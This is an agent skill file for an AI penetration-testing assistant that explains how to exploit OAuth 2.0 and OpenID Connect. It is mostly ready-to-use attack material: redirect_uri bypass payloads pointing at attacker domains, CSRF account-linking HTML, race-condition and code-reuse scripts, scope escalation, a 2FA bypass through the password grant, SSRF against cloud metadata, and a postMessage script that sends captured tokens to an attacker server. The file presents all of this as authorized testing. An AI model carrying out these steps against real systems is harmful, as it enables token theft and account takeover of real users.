---
name: oauth-attacks
description: >
  Exploit OAuth 2.0 and OpenID Connect vulnerabilities during authorized
  penetration testing.
keywords:
  - oauth
  - oauth attack
  - oauth bypass
  - openid connect
  - oidc attack
  - social login bypass
  - redirect uri bypass
  - oauth token theft
  - authorization code theft
  - oauth misconfiguration
  - sso bypass
  - login with google
  - login with facebook
  - oauth account takeover
  - pkce bypass
  - oauth state bypass
  - oauth scope escalation
tools:
  - burpsuite
  - jwt_tool
  - curl
opsec: low
---

# OAuth 2.0 / OpenID Connect Attacks

You are helping a penetration tester exploit OAuth 2.0 and OpenID Connect
vulnerabilities. The target application uses OAuth for authentication (social
login, SSO) or authorization (API access, third-party integrations). The goal
is to steal authorization codes or tokens, bypass authentication, escalate
privileges, or achieve account takeover. All testing is under explicit written
authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[oauth-attacks] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Web Interaction

OAuth flows are multi-step browser interactions — **browser tools are the
natural fit** for testing these flows end-to-end.

- **`browser_open`** for authorization endpoints — initiates the OAuth flow
- **`browser_fill`** / **`browser_click`** for consent screens, login prompts,
  and permission dialogs
- **`browser_cookies`** to extract tokens from redirect chains and inspect
  session state after OAuth completion
- **`browser_evaluate`** to inspect URL fragments for implicit grant tokens
  (e.g., `window.location.hash`), extract authorization codes from redirects
- **curl** for direct token endpoint requests, testing `redirect_uri`
  manipulation, and code/token exchange

## Prerequisites

- An application using OAuth 2.0 or OpenID Connect for authentication
- Burp Suite (to intercept and modify OAuth redirects)
- A domain you control for redirect URI testing
- A test account on the application (to capture legitimate OAuth flows)

## Step 1: Assess

Map the OAuth implementation by capturing a complete flow.

### Identify OAuth Endpoints

```bash
# Check for OpenID Connect discovery
curl -s "https://TARGET/.well-known/openid-configuration" | jq .
curl -s "https://TARGET/.well-known/oauth-authorization-server" | jq .

# Key endpoints to find:
# - Authorization endpoint: /authorize, /oauth/authorize, /auth
# - Token endpoint: /token, /oauth/token
# - JWKS endpoint: /jwks, /.well-known/jwks.json
# - Registration endpoint: /register (dynamic client registration)
# - Userinfo endpoint: /userinfo, /me
```

### Capture the Authorization Request

Intercept the login flow in Burp and note:

```
GET /authorize?
  client_id=APP_CLIENT_ID&
  response_type=code&           # or token, id_token
  redirect_uri=https://app.com/callback&
  scope=openid+email+profile&
  state=RANDOM_STATE&
  nonce=RANDOM_NONCE&           # OIDC only
  code_challenge=CHALLENGE&     # PKCE
  code_challenge_method=S256    # PKCE
```

Key parameters to note:
- **response_type**: `code` (auth code), `token` (implicit), `id_token` (OIDC)
- **redirect_uri**: the callback URL
- **state**: CSRF protection for OAuth flow
- **scope**: requested permissions
- **PKCE parameters**: code_challenge and method

### Identify the Grant Type

| Grant Type | Flow | Attack Surface |
|-----------|------|---------------|
| Authorization Code | Browser redirect → code → token exchange | Redirect URI, code theft, state bypass |
| Implicit | Browser redirect → token in fragment | Token exposure, no code exchange |
| PKCE | Auth code + code_verifier | PKCE downgrade, weak verifier |
| Client Credentials | Server-to-server, no user | Secret leakage |
| Password (ROPC) | Direct username/password → token | 2FA bypass |

## Step 2: Redirect URI Manipulation

The most common OAuth vulnerability — bypassing redirect_uri validation to
steal authorization codes or tokens.

### Basic Redirect to Attacker Domain

```
# Try arbitrary domain
https://IDP/authorize?...&redirect_uri=https://attacker.com/callback

# Try subdomain variants
https://IDP/authorize?...&redirect_uri=https://attacker.app.com/callback
https://IDP/authorize?...&redirect_uri=https://app.com.attacker.com/callback

# Try localhost
https://IDP/authorize?...&redirect_uri=https://localhost.attacker.com/callback
```

### Path Traversal

```
# Bypass directory-level checks
https://IDP/authorize?...&redirect_uri=https://app.com/callback/../attacker-page
https://IDP/authorize?...&redirect_uri=https://app.com/callback/..%2F..%2Fattacker
```

### Open Redirect Chain

If the app has an open redirect, use it to relay the code:

```
# App has open redirect at /redirect?url=
https://IDP/authorize?...&redirect_uri=https://app.com/redirect?url=https://attacker.com
```

The IdP validates `app.com`, the app redirects to `attacker.com` with the
code still in the URL.

### Parameter Pollution

```
# Multiple redirect_uri parameters
https://IDP/authorize?...&redirect_uri=https://app.com/callback&redirect_uri=https://attacker.com

# Redirect within redirect
https://IDP/authorize?...&redirect_uri=https://app.com/callback?next=https://attacker.com
```

### Special Characters

```
# Null byte
https://IDP/authorize?...&redirect_uri=https://app.com/callback%00.attacker.com

# At sign (userinfo bypass)
https://IDP/authorize?...&redirect_uri=https://app.com@attacker.com/callback

# Fragment
https://IDP/authorize?...&redirect_uri=https://app.com/callback%23.attacker.com

# Protocol-relative
https://IDP/authorize?...&redirect_uri=//attacker.com/callback
```

### Scope Bypass to Widen redirect_uri

Some IdPs relax redirect_uri validation for certain scopes:

```
# Invalid scope may change validation behavior
https://IDP/authorize?...&scope=invalid&redirect_uri=https://attacker.com
```

## Step 3: State Parameter Bypass

The state parameter prevents CSRF on the OAuth flow. Test if it's properly
validated.

### Missing State

```
# Remove state from authorization request
https://IDP/authorize?...&state=
# or omit entirely

# If the callback accepts the response without state validation,
# attacker can force victim to complete an OAuth flow with attacker's code
```

### State Not Validated

```
# Complete OAuth flow normally, capture the callback:
https://app.com/callback?code=AUTH_CODE&state=LEGIT_STATE

# Replay with modified state:
https://app.com/callback?code=AUTH_CODE&state=ANYTHING

# If accepted → state validation is broken
```

### CSRF via Missing State — Account Linking Attack

```html
<!-- Force victim to link attacker's OAuth account to their app account -->
<!-- 1. Attacker starts OAuth flow, captures callback URL with attacker's code -->
<!-- 2. Victim clicks this link (or auto-redirected) -->
<a href="https://app.com/callback?code=ATTACKER_CODE">Link Account</a>

<!-- If state isn't validated, victim's app account gets linked to
     attacker's OAuth identity. Attacker can now log in as victim. -->
```

## Step 4: Authorization Code Attacks

### Code Reuse

```bash
# Capture a valid authorization code
# Try redeeming it multiple times

# First redemption (should work)
curl -s -X POST "https://IDP/token" \
  -d "grant_type=authorization_code&code=AUTH_CODE&client_id=APP&redirect_uri=https://app.com/callback"

# Second redemption (should fail — if it works, codes are reusable)
curl -s -X POST "https://IDP/token" \
  -d "grant_type=authorization_code&code=AUTH_CODE&client_id=APP&redirect_uri=https://app.com/callback"
```

### Code Not Bound to Client

```bash
# Capture code from App A's flow
# Try redeeming with App B's credentials

curl -s -X POST "https://IDP/token" \
  -d "grant_type=authorization_code&code=APP_A_CODE&client_id=APP_B&client_secret=APP_B_SECRET&redirect_uri=https://app-b.com/callback"

# If accepted → audience binding broken
```

### Code Lifetime

```bash
# Capture code, wait, then redeem
# RFC 6749 recommends max 10 minutes

# Wait 15+ minutes
curl -s -X POST "https://IDP/token" \
  -d "grant_type=authorization_code&code=OLD_CODE&client_id=APP&redirect_uri=https://app.com/callback"

# If accepted → code lifetime too long
```

### Race Condition (Concurrent Redemption)

Send multiple token requests simultaneously with the same code:

```python
import requests
import threading

url = "https://IDP/token"
data = {
    "grant_type": "authorization_code",
    "code": "AUTH_CODE",
    "client_id": "APP",
    "client_secret": "SECRET",
    "redirect_uri": "https://app.com/callback"
}

results = []

def redeem():
    r = requests.post(url, data=data)
    results.append(r.json())

threads = [threading.Thread(target=redeem) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()

tokens = [r for r in results if "access_token" in r]
print(f"[*] {len(tokens)} successful redemptions out of 20")
```

## Step 5: Token Leakage

### Implicit Flow Token in Fragment

```
# Implicit flow returns token in URL fragment
https://app.com/callback#access_token=TOKEN&token_type=Bearer&expires_in=3600

# Fragment is accessible via:
# - XSS on the callback page
# - Referer header if callback page loads external resources
# - Browser history
# - postMessage if callback uses it
```

### Referer Leakage

If the callback page loads external resources (images, scripts, analytics),
the URL (including code/token) may leak via Referer header.

```bash
# Check if callback page loads third-party resources
curl -s "https://app.com/callback?code=test" | \
  grep -oP 'src="https?://[^"]*"' | grep -v "app.com"
```

### Token in URL (Non-Fragment)

Some implementations pass tokens as query parameters instead of fragments:

```
# Bad: token in query string (logged by servers, proxies, analytics)
https://app.com/callback?access_token=TOKEN

# Check server logs, proxy logs, browser history
```

### postMessage Interception

If the callback uses postMessage to relay tokens:

```html
<script>
window.addEventListener('message', function(event) {
  // Capture tokens from postMessage
  if (event.data && (event.data.access_token || event.data.code)) {
    fetch('https://ATTACKER_SERVER/exfil', {
      method: 'POST',
      body: JSON.stringify(event.data)
    });
  }
});
</script>
<!-- Open the OAuth callback in a popup -->
<script>
var popup = window.open('https://IDP/authorize?...&response_mode=web_message');
</script>
```

## Step 6: OpenID Connect Attacks

### ID Token Manipulation

If the application validates ID tokens (JWTs) from the IdP:

```bash
# Decode the ID token
echo "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.sig" | \
  cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Check for:
# - Algorithm: RS256, HS256, none
# - Claims: sub, email, email_verified, aud, iss
# - Signature validation
```

Escalate for algorithm confusion, alg:none, and key injection
attacks on ID tokens.

### Email Claim Abuse

Some IdPs allow users to set unverified email addresses:

```
# Attacker creates account at IdP with victim's email (unverified)
# Logs into target app via OAuth
# App trusts email claim → creates/links account for victim's email
# Attacker now controls victim's app account

# Check: does the app verify email_verified claim?
# Check: does the IdP enforce email verification?
```

### Nonce Bypass

```
# OIDC uses nonce to prevent token replay
# Test: omit nonce from authorization request
https://IDP/authorize?...&nonce=

# Test: reuse nonce across sessions
# If accepted → replay attacks possible
```

### Discovery Endpoint SSRF

If the IdP supports dynamic client registration:

```bash
curl -s -X POST "https://IDP/register" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Evil App",
    "redirect_uris": ["https://attacker.com/callback"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/",
    "jwks_uri": "http://internal.server:8080/sensitive",
    "sector_identifier_uri": "http://192.168.1.1/admin"
  }'

# If the IdP fetches logo_uri, jwks_uri, or sector_identifier_uri → SSRF
```

## Step 7: PKCE Bypass

### PKCE Not Enforced

```bash
# Try redeeming code without code_verifier
curl -s -X POST "https://IDP/token" \
  -d "grant_type=authorization_code&code=AUTH_CODE&client_id=APP&redirect_uri=https://app.com/callback"

# If token returned without code_verifier → PKCE not enforced
# Stolen codes can be redeemed without the challenge
```

### Plain Method Downgrade

```
# Request with plain instead of S256
https://IDP/authorize?...&code_challenge=VERIFIER&code_challenge_method=plain

# Redeem with same value as both challenge and verifier
curl -s -X POST "https://IDP/token" \
  -d "...&code_verifier=VERIFIER"

# If S256 not enforced → attacker who sees the challenge can redeem the code
```

## Step 8: Scope and Permission Attacks

### Scope Escalation on Token Request

```bash
# Authorization was granted for scope=read
# Try requesting more at token endpoint
curl -s -X POST "https://IDP/token" \
  -d "grant_type=authorization_code&code=AUTH_CODE&client_id=APP&scope=read+write+admin&redirect_uri=https://app.com/callback"

# If token has expanded scope → scope escalation
```

### Token Refresh with Expanded Scope

```bash
# Refresh token and request additional scopes
curl -s -X POST "https://IDP/token" \
  -d "grant_type=refresh_token&refresh_token=REFRESH_TOKEN&scope=read+write+admin"
```

### Resource Owner Password Credentials (2FA Bypass)

```bash
# ROPC grant bypasses browser-based 2FA
curl -s -X POST "https://IDP/token" \
  -d "grant_type=password&username=USER&password=PASS&client_id=APP&client_secret=SECRET"

# If token returned → 2FA is bypassed entirely
```

## Step 9: Account Takeover Chains

### Pre-Authentication Account Linking

1. Attacker registers at the app with `victim@example.com` (no email verification)
2. Victim later clicks "Login with Google" (which has `victim@example.com`)
3. App links Google identity to existing account (attacker's)
4. Attacker has access to victim's linked data

### OAuth CSRF + Account Linking

1. Attacker initiates "Link GitHub" flow, captures callback with attacker's code
2. Victim visits attacker's page containing:
   ```html
   <img src="https://app.com/callback?code=ATTACKER_GITHUB_CODE" />
   ```
3. Victim's app account gets linked to attacker's GitHub
4. Attacker logs in via GitHub → accesses victim's account

### Redirect URI + Referer Chain

1. Find open redirect on the app: `https://app.com/go?url=https://attacker.com`
2. Use as redirect_uri: `https://IDP/authorize?...&redirect_uri=https://app.com/go?url=https://attacker.com`
3. IdP validates `app.com`, redirects to app with code
4. App's open redirect sends victim to `attacker.com` — code in Referer
5. Attacker redeems code → account takeover

## Step 10: Escalate or Pivot

After confirming OAuth vulnerabilities:

- **Authorization code stolen**: Redeem for access token, access victim's API
  resources. Check what scopes the token grants.
- **Access token obtained**: Test token against all API endpoints. Route to
  **idor** if the API has broken object-level authorization.
- **Account takeover achieved**: Document full chain. Check for admin
  escalation via role manipulation.
- **ID token forged or manipulated**: Escalate for deeper
  JWT exploitation (alg:none, key confusion, claim tampering).
- **SSRF via dynamic registration**: Escalate for cloud metadata
  and internal network exploitation.
- **Client secret found**: Test against other OAuth-enabled services that
  use the same IdP.
- **2FA bypass via ROPC**: Document as separate finding — complete auth
  bypass.

Report in your return summary: any new credentials, tokens, access, vulns,
or pivot paths discovered.

When routing, pass along: OAuth flow type, IdP identified, working bypass
technique, tokens obtained.

## OPSEC Notes

- OAuth testing involves URL parameter manipulation — minimal server-side
  detection surface
- Redirect URI probing generates 302 redirects visible in IdP logs
- Authorization code redemption attempts are logged at the token endpoint
- Dynamic client registration may be monitored
- Account linking operations are visible in application audit logs
- ROPC grant attempts may trigger brute-force detection

## Troubleshooting

### Redirect URI Strictly Validated

- Try path traversal: `/callback/../other-page`
- Try query parameter append: `/callback?param=attacker.com`
- Try fragment: `/callback#@attacker.com`
- Look for open redirect on the same domain to chain
- Check if alternate API versions have weaker validation
- Try different registered redirect URIs (some apps have multiple)

### All Tokens Are Short-Lived

- Focus on authorization code theft (codes exchanged for tokens server-side)
- Check if refresh tokens are issued (longer-lived)
- Test token reuse across different client applications
- Check if token revocation is properly implemented

### PKCE Enforced and Properly Implemented

- PKCE is designed to prevent code interception — this defense is working
- Focus on other attack vectors: redirect URI bypass, state bypass, token
  leakage, account linking flaws
- Check if the code_verifier has sufficient entropy

### IdP Requires Exact redirect_uri Match

- This is correct implementation — exact match is the strongest defense
- Focus on: state bypass, account linking, scope escalation, token leakage
- Look for other OAuth clients on the same IdP with weaker redirect_uri
  validation

### Can't Register Dynamic Clients

- Test with existing client_id values found in source code, mobile apps,
  or public documentation
- Check for client_id enumeration
- Use known client_ids from the IdP's developer portal
